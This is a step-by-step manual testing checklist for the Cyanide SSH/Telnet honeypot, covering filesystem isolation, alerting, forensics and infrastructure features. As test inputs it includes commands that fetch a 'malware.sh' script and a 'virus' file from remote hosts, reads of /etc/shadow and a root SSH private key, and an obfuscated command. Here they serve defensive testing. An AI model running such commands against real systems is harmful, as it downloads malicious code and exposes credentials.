# 🧪 Cyanide Manual Testing Guide (The Gauntlet)

This guide provides a step-by-step checklist to manually verify every feature of the Cyanide honeypot. Tests are ordered from **Level 1 (Basic)** to **Level 5 (Expert/Adversarial)**.

---

## 🟢 Level 1: Basic Connectivity & Emulation
*Goal: Ensure the honeypot is reachable and basic services respond.*

1.  **SSH Login**
    - `ssh root@<ip> -p 2222` (use password `toor`).
    - **Check**: Do you get a prompt? Does `whoami` return `root`?
2.  **Telnet Login**
    - `telnet <ip> 2323`.
    - **Check**: Do you see the `/etc/issue` banner? Does login work?
3.  **Basic Command execution**
    - Run `ls -la`, `cd /etc`, `cat /etc/passwd`.
    - **Check**: Is the output realistic? Does it match the Ubuntu/Profile metadata?
4.  **Metrics Dashboard**
    - Visit `http://<ip>:9090/stats` in your browser.
    - **Check**: Does the JSON show `active_sessions: 1`?

---

## 🟡 Level 2: Filesystem & Persistence
*Goal: Verify the Virtual Filesystem (VFS) and Memory Overlay.*

1.  **Write & Read**
    - `echo "hacked" > /tmp/test.txt` then `cat /tmp/test.txt`.
    - **Check**: Is the file there? 
2.  **Session Isolation**
    - Open TWO SSH sessions. In Session A: `touch /tmp/session_a`. In Session B: `ls /tmp/session_a`.
    - **Check**: Session B should **NOT** see the file (each session must have a private overlay).
3.  **Persistence check**
    - Exit SSH, then log back in.
    - **Check**: `/tmp/test.txt` should be **GONE** (VFS is ephemeral/per-session).

---

## 🟠 Level 3: Security & Intelligence
*Goal: Test the alerting and tracking mechanisms.*

1.  **Honeytoken Tripwire**
    - Run `cat /etc/shadow` or `cat /root/.ssh/id_rsa`.
    - **Check**: Observe the logs (`tail -f var/log/cyanide/cyanide.log`). You should see a `CRITICAL_ALERT` event.
2.  **IoC Extraction**
    - Run `curl http://91.222.11.4/malware.sh`.
    - **Check**: Look for an `ioc_detected` event in the logs containing the IP and URL.
3.  **Quarantine System**
    - (Mock download) `wget http://example.com/virus`.
    - **Check**: Look in `var/quarantine/`. Is the file saved there? Is there a metadata `.json` file with the SHA256?

---

## 🔴 Level 4: Advanced Analysis (ML & TTY)
*Goal: Verify high-fidelity forensic data.*

1.  **TTY Replay**
    - Complete a session with multiple commands.
    - Find the session ID in `var/log/cyanide/tty/`.
    - Run: `scriptreplay var/log/cyanide/tty/<session>/<id>.time var/log/cyanide/tty/<session>/<id>.log`.
    - **Check**: Does the playback match your typing exactly?
2.  **Bot Detection**
    - Copy a long block of text (e.g., a script) and paste it into the SSH terminal.
    - **Check**: In the logs, the `command.input` event should now have `is_bot: true` (due to timing/paste detection).
3.  **ML Anomaly (If ML enabled)**
    - Run a very weird/obfuscated command: `$(printf "\154\163")`.
    - **Check**: Search for `anomaly_score` in the logs.

---

## 🟣 Level 5: Expert Infrastructure
*Goal: Test system-wide orchestration and proxying.*

1.  **SSH Tunnel Interception**
    - Run: `ssh -p 2222 root@<ip> -L 8080:google.com:80`.
    - **Check**: Does Cyanide log a `local_forward.request`? (Requires `forwarding_enabled: true` in config).
2.  **VMPool Failover (Backend Mode)**
    - Change `ssh.backend_mode` to `pool` in `app.yaml`.
    - **Check**: Connect via SSH. Does Cyanide trigger a Libvirt/KVM clone?
3.  **Log Browser**
    - Visit `http://<ip>:9090/logs/`.
    - **Check**: Can you browse the `tty` folder and read logs directly in the browser?
4.  **Automatic Cleanup**
    - Artificially create a file with an old date: `touch -d "2020-01-01" var/log/cyanide/old.log`.
    - Wait for the cleanup interval or trigger it.
    - **Check**: Does the file get deleted?
